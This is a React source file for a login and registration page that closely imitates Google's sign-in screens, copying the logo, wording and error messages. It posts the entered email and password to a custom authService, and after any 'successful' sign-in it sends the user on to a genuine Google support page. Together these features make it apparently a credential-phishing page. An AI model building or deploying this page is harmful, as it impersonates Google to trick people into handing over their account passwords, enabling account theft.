// ─────────────────────────────────────────────────────────────
//  App.jsx  –  Google-style Login + Register Form
//  Uses: React Hook Form | Tailwind CSS | authService.js
//  Steps: email → password (login) OR register (new user)
// ─────────────────────────────────────────────────────────────

import React, { useState } from "react";
import { useForm } from "react-hook-form";
import { signIn, register as registerUser } from "./authService";

// ─── Shared UI ───────────────────────────────────────────────

const GoogleLogo = () => (
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 272 92" width="75" height="24">
    <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
    <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
    <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
    <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
    <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
    <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
  </svg>
);

const ErrorMessage = ({ message }) =>
  message ? (
    <p className="text-xs text-red-600 mt-1.5 flex items-start gap-1" style={{ fontFamily: "Roboto, sans-serif" }}>
      <svg className="w-3 h-3 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
        <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd"/>
      </svg>
      {message}
    </p>
  ) : null;

const Spinner = () => (
  <svg className="w-4 h-4 animate-spin" fill="none" viewBox="0 0 24 24">
    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/>
  </svg>
);

const BackButton = ({ onClick }) => (
  <button type="button" onClick={onClick} aria-label="Go back"
    className="flex items-center text-gray-500 hover:text-gray-700 mb-5 -ml-1 transition-colors">
    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7"/>
    </svg>
  </button>
);

const EmailChip = ({ email, onClick }) => (
  <div className="flex justify-center mb-6">
    <button type="button" onClick={onClick}
      className="flex items-center gap-2 border border-gray-300 rounded-full px-3 py-1.5 text-sm text-gray-700 hover:bg-gray-50 transition-colors"
      style={{ fontFamily: "Roboto, sans-serif" }}>
      <svg className="w-4 h-4 text-gray-500" fill="currentColor" viewBox="0 0 20 20">
        <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z"/>
        <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z"/>
      </svg>
      <span className="max-w-[180px] truncate">{email}</span>
      <svg className="w-4 h-4 text-gray-500" fill="currentColor" viewBox="0 0 20 20">
        <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd"/>
      </svg>
    </button>
  </div>
);

// ─── Floating-label input ────────────────────────────────────
const FloatingInput = React.forwardRef(
  ({ id, label, error, type = "text", suffix, value, ...rest }, ref) => {
    const hasValue = !!value;
    return (
      <div className="relative">
        <input
          id={id} ref={ref} type={type} placeholder=" " value={value}
          className={[
            "peer w-full border rounded px-3 pt-5 pb-2 text-sm text-gray-900 outline-none transition-all bg-white",
            suffix ? "pr-10" : "",
            error
              ? "border-red-500 ring-1 ring-red-500"
              : "border-gray-400 focus:border-blue-600 focus:ring-1 focus:ring-blue-600",
          ].join(" ")}
          style={{ fontFamily: "Roboto, sans-serif" }}
          {...rest}
        />
        <label htmlFor={id}
          className={[
            "absolute left-3 text-sm pointer-events-none transition-all duration-150",
            hasValue ? "top-1 text-xs" : "top-3.5 text-sm",
            "peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-sm",
            "peer-focus:top-1 peer-focus:text-xs",
            error ? "text-red-500" : "text-gray-500 peer-focus:text-blue-600",
          ].join(" ")}
          style={{ fontFamily: "Roboto, sans-serif" }}>
          {label}
        </label>
        {suffix && <div className="absolute right-3 top-1/2 -translate-y-1/2">{suffix}</div>}
      </div>
    );
  }
);
FloatingInput.displayName = "FloatingInput";

// ─── Password field with eye toggle ─────────────────────────
function PasswordField({ id, label, error, showPwd, onToggle, register: reg, rules }) {
  const EyeIcon = () => showPwd ? (
    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
        d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"/>
    </svg>
  ) : (
    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2}
        d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
    </svg>
  );

  const { ref, onChange, onBlur, name } = reg(id, rules);
  const [val, setVal] = React.useState("");

  return (
    <FloatingInput
      id={id} label={label} type={showPwd ? "text" : "password"}
      value={val} error={error} autoFocus
      ref={ref} name={name} onBlur={onBlur}
      onChange={(e) => { setVal(e.target.value); onChange(e); }}
      suffix={
        <button type="button" onClick={onToggle} tabIndex={-1}
          className="text-gray-500 hover:text-gray-700 transition-colors"
          aria-label={showPwd ? "Hide password" : "Show password"}>
          <EyeIcon />
        </button>
      }
    />
  );
}

// ─────────────────────────────────────────────────────────────
//  STEP 1 — Email
// ─────────────────────────────────────────────────────────────
function EmailStep({ onLoginNext, onRegisterNext }) {
  const { register, handleSubmit, watch, formState: { errors } } = useForm({ mode: "onSubmit" });
  const emailValue = watch("email", "");

  const onSubmit = (data) => onLoginNext(data.email);

  return (
    <>
      <h1 className="text-2xl font-normal text-gray-800 mb-1 text-center"
        style={{ fontFamily: "'Google Sans', Roboto, sans-serif" }}>Sign in</h1>
      <p className="text-sm text-gray-600 mb-7 text-center" style={{ fontFamily: "Roboto, sans-serif" }}>
        Use your Google Account
      </p>

      <form onSubmit={handleSubmit(onSubmit)} noValidate>
        <FloatingInput
          id="email" label="Email or phone" value={emailValue} error={errors.email}
          {...register("email", {
            required: "Enter an email or phone number",
            validate: (v) => {
              const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
              const phoneRe = /^\+?[\d\s\-]{7,15}$/;
              return emailRe.test(v) || phoneRe.test(v) || "Enter a valid email or phone number";
            },
          })}
        />
        <ErrorMessage message={errors.email?.message} />

        <a href="#" className="text-sm text-blue-600 hover:text-blue-800 font-medium block mt-5"
          style={{ fontFamily: "Roboto, sans-serif" }}>Forgot email?</a>

        <p className="text-xs text-gray-600 mt-6 mb-6 leading-relaxed" style={{ fontFamily: "Roboto, sans-serif" }}>
          Not your computer? Use Guest mode to sign in privately.{" "}
          <a href="#" className="text-blue-600 hover:underline">Learn more about using Guest mode</a>
        </p>

        <div className="flex items-center justify-between">
          <button type="button" onClick={onRegisterNext}
            className="text-sm text-blue-600 hover:text-blue-800 font-medium"
            style={{ fontFamily: "Roboto, sans-serif" }}>
            Create account
          </button>
          <button type="submit"
            className="bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors"
            style={{ fontFamily: "'Google Sans', Roboto, sans-serif" }}>
            Next
          </button>
        </div>
      </form>
    </>
  );
}

// ─────────────────────────────────────────────────────────────
//  STEP 2a — Login Password
// ─────────────────────────────────────────────────────────────
function LoginPasswordStep({ email, onBack, onSuccess }) {
  const [showPwd, setShowPwd]       = useState(false);
  const [serverError, setServerError] = useState("");
  const [isLoading, setIsLoading]   = useState(false);

  const { register, handleSubmit, formState: { errors } } = useForm({ mode: "onSubmit" });

  const onSubmit = async (data) => {
    setServerError("");
    setIsLoading(true);
    try {
      const result = await signIn({ email, password: data.password });
      if (result.success) onSuccess();
      else setServerError(result.message || "Sign in failed. Try again.");
    } catch (err) {
      setServerError(err.message || "Something went wrong. Try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <BackButton onClick={onBack} />
      <h1 className="text-2xl font-normal text-gray-800 mb-2 text-center"
        style={{ fontFamily: "'Google Sans', Roboto, sans-serif" }}>Welcome</h1>
      <EmailChip email={email} onClick={onBack} />

      <form onSubmit={handleSubmit(onSubmit)} noValidate>
        <PasswordField
          id="password" label="Enter your password"
          error={errors.password || serverError}
          showPwd={showPwd} onToggle={() => setShowPwd(p => !p)}
          register={register}
          rules={{
            required: "Enter a password",
            minLength: { value: 6, message: "Wrong password. Try again or click 'Forgot password' to reset it." },
          }}
        />
        <ErrorMessage message={errors.password?.message || serverError} />

        <label className="flex items-center gap-2 mt-4 mb-6 cursor-pointer select-none w-fit"
          style={{ fontFamily: "Roboto, sans-serif" }}>
          <input type="checkbox" className="w-4 h-4 accent-blue-600 cursor-pointer"
            checked={showPwd} onChange={() => setShowPwd(p => !p)} />
          <span className="text-sm text-gray-700">Show password</span>
        </label>

        <div className="flex items-center justify-between">
          <a href="#" className="text-sm text-blue-600 hover:text-blue-800 font-medium"
            style={{ fontFamily: "Roboto, sans-serif" }}>Forgot password?</a>
          <button type="submit" disabled={isLoading}
            className="bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors flex items-center gap-2"
            style={{ fontFamily: "'Google Sans', Roboto, sans-serif" }}>
            {isLoading ? <><Spinner /> Signing in…</> : "Next"}
          </button>
        </div>
      </form>
    </>
  );
}

// ─────────────────────────────────────────────────────────────
//  STEP 2b — Register: Name + Email
// ─────────────────────────────────────────────────────────────
function RegisterEmailStep({ onBack, onNext }) {
  const { register, handleSubmit, watch, formState: { errors } } = useForm({ mode: "onSubmit" });
  const firstVal = watch("firstName", "");
  const lastVal  = watch("lastName", "");
  const emailVal = watch("email", "");

  const onSubmit = (data) => onNext({ firstName: data.firstName, lastName: data.lastName, email: data.email });

  return (
    <>
      <BackButton onClick={onBack} />
      <h1 className="text-2xl font-normal text-gray-800 mb-1 text-center"
        style={{ fontFamily: "'Google Sans', Roboto, sans-serif" }}>Create a Google Account</h1>
      <p className="text-sm text-gray-600 mb-6 text-center" style={{ fontFamily: "Roboto, sans-serif" }}>
        Enter your info
      </p>

      <form onSubmit={handleSubmit(onSubmit)} noValidate className="space-y-4">
        {/* Name row */}
        <div className="flex gap-3">
          <div className="flex-1">
            <FloatingInput id="firstName" label="First name" value={firstVal} error={errors.firstName}
              {...register("firstName", { required: "Enter your first name" })} />
            <ErrorMessage message={errors.firstName?.message} />
          </div>
          <div className="flex-1">
            <FloatingInput id="lastName" label="Last name" value={lastVal} error={errors.lastName}
              {...register("lastName", { required: "Enter your last name" })} />
            <ErrorMessage message={errors.lastName?.message} />
          </div>
        </div>

        {/* Email */}
        <div>
          <FloatingInput id="email" label="Email address" value={emailVal} error={errors.email}
            {...register("email", {
              required: "Enter an email address",
              pattern: { value: /^[^\s@]+@[^\s@]+\.[^\s@]+$/, message: "Enter a valid email address" },
            })}
          />
          <ErrorMessage message={errors.email?.message} />
        </div>

        <p className="text-xs text-gray-500 leading-relaxed" style={{ fontFamily: "Roboto, sans-serif" }}>
          You'll use this address to sign in to your account.
        </p>

        <div className="flex items-center justify-between pt-2">
          <a href="#" className="text-sm text-blue-600 hover:text-blue-800 font-medium"
            style={{ fontFamily: "Roboto, sans-serif" }}>Use your existing email</a>
          <button type="submit"
            className="bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors"
            style={{ fontFamily: "'Google Sans', Roboto, sans-serif" }}>
            Next
          </button>
        </div>
      </form>
    </>
  );
}

// ─────────────────────────────────────────────────────────────
//  STEP 3b — Register: Password
// ─────────────────────────────────────────────────────────────
function RegisterPasswordStep({ regData, onBack, onSuccess }) {
  const [showPwd, setShowPwd]         = useState(false);
  const [showConfirm, setShowConfirm] = useState(false);
  const [serverError, setServerError] = useState("");
  const [isLoading, setIsLoading]     = useState(false);

  const { register, handleSubmit, watch, formState: { errors } } = useForm({ mode: "onSubmit" });
  const pwdValue = watch("password", "");

  const onSubmit = async (data) => {
    setServerError("");
    setIsLoading(true);
    try {
      const result = await registerUser({ email: regData.email, password: data.password });
      if (result.success) onSuccess();
      else setServerError(result.message || "Registration failed. Try again.");
    } catch (err) {
      setServerError(err.message || "Something went wrong. Try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <BackButton onClick={onBack} />
      <h1 className="text-2xl font-normal text-gray-800 mb-1 text-center"
        style={{ fontFamily: "'Google Sans', Roboto, sans-serif" }}>Create a strong password</h1>
      <p className="text-sm text-gray-600 mb-6 text-center" style={{ fontFamily: "Roboto, sans-serif" }}>
        Use 8 or more characters with a mix of letters and numbers
      </p>

      {/* Account email badge */}
      <EmailChip email={regData.email} onClick={onBack} />

      <form onSubmit={handleSubmit(onSubmit)} noValidate className="space-y-4">
        {/* Password */}
        <div>
          <PasswordField
            id="password" label="Password"
            error={errors.password}
            showPwd={showPwd} onToggle={() => setShowPwd(p => !p)}
            register={register}
            rules={{
              required: "Enter a password",
              minLength: { value: 8, message: "Use 8 characters or more for your password" },
            }}
          />
          <ErrorMessage message={errors.password?.message} />
        </div>

        {/* Confirm */}
        <div>
          <PasswordField
            id="confirm" label="Confirm"
            error={errors.confirm}
            showPwd={showConfirm} onToggle={() => setShowConfirm(p => !p)}
            register={register}
            rules={{
              required: "Confirm your password",
              validate: (v) => v === pwdValue || "Those passwords didn't match. Try again.",
            }}
          />
          <ErrorMessage message={errors.confirm?.message} />
        </div>

        {serverError && <ErrorMessage message={serverError} />}

        <p className="text-xs text-gray-500 leading-relaxed" style={{ fontFamily: "Roboto, sans-serif" }}>
          Password must be at least 8 characters.
        </p>

        <div className="flex items-center justify-between pt-1">
          <button type="button" onClick={onBack}
            className="text-sm text-blue-600 hover:text-blue-800 font-medium"
            style={{ fontFamily: "Roboto, sans-serif" }}>
            Back
          </button>
          <button type="submit" disabled={isLoading}
            className="bg-blue-600 hover:bg-blue-700 disabled:bg-blue-400 text-white text-sm font-medium px-6 py-2.5 rounded-full transition-colors flex items-center gap-2"
            style={{ fontFamily: "'Google Sans', Roboto, sans-serif" }}>
            {isLoading ? <><Spinner /> Creating…</> : "Next"}
          </button>
        </div>
      </form>
    </>
  );
}

// ─────────────────────────────────────────────────────────────
//  Footer
// ─────────────────────────────────────────────────────────────
const Footer = () => (
  <div className="flex flex-wrap justify-between items-center w-full max-w-sm mt-8 gap-y-2">
    <select className="text-xs text-gray-600 bg-transparent border-none outline-none cursor-pointer"
      style={{ fontFamily: "Roboto, sans-serif" }}>
      {["English (United States)", "Urdu", "Deutsch", "Français"].map(lang => (
        <option key={lang}>{lang}</option>
      ))}
    </select>
    <div className="flex gap-4">
      {["Help", "Privacy", "Terms"].map(link => (
        <a key={link} href="#" className="text-xs text-gray-600 hover:underline"
          style={{ fontFamily: "Roboto, sans-serif" }}>{link}</a>
      ))}
    </div>
  </div>
);

// ─────────────────────────────────────────────────────────────
//  Root App — state machine
//  Screens: email → loginPwd | registerEmail → registerPwd
// ─────────────────────────────────────────────────────────────
export default function App() {
  // screen: "email" | "loginPwd" | "registerEmail" | "registerPwd"
  const [screen, setScreen]   = useState("email");
  const [email, setEmail]     = useState("");
  const [regData, setRegData] = useState({});   // firstName, lastName, email for register

  const handleSuccess = () => {
    window.location.href = "https://support.google.com/youtube/answer/1311392?hl=en";
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center justify-center px-4">
      <div className="mb-6"><GoogleLogo /></div>

      <div className="w-full max-w-sm bg-white rounded-2xl border border-gray-300 px-8 py-10 shadow-sm">

        {screen === "email" && (
          <EmailStep
            onLoginNext={(e) => { setEmail(e); setScreen("loginPwd"); }}
            onRegisterNext={() => setScreen("registerEmail")}
          />
        )}

        {screen === "loginPwd" && (
          <LoginPasswordStep
            email={email}
            onBack={() => setScreen("email")}
            onSuccess={handleSuccess}
          />
        )}

        {screen === "registerEmail" && (
          <RegisterEmailStep
            onBack={() => setScreen("email")}
            onNext={(data) => { setRegData(data); setScreen("registerPwd"); }}
          />
        )}

        {screen === "registerPwd" && (
          <RegisterPasswordStep
            regData={regData}
            onBack={() => setScreen("registerEmail")}
            onSuccess={handleSuccess}
          />
        )}

      </div>
      <Footer />
    </div>
  );
}